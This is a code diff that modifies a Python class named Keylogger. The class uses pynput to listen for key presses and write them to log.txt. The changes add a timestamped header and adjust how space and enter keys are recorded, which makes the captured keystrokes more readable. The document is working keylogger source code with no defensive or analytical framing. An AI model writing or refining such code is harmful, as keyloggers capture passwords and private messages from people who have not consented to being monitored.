@@ -1,4 +1,4 @@
-import pynput
+import pynput,datetime
 from pynput.keyboard import Key, Listener
 
 
@@ -8,8 +8,10 @@ class Keylogger():
 
         self.keys = []
         self.lock = lock
-        with open("log.txt", "w") as f:
-            pass
+        now = datetime.datetime.now()
+        f = open("log.txt", "w")
+        f.write("---START--- Date: {}".format(now))
+
 
     def on_press(self,key):
 
@@ -31,10 +33,10 @@ class Keylogger():
             with open("log.txt", "a+") as f:
                 for key in self.keys:
                     k = str(key).replace("'","")
-                    if k.find("space") > 0:
+                    if k.find("enter") > 0:
                         f.write('\n')
-                    elif k.find("enter") > 0:
-                        f.write('\n')
+                    elif k.find("space") > 0:
+                        f.write(" ")
                     elif k.find("Key") == -1:
                         f.write(k)
         except FileNotFoundError:
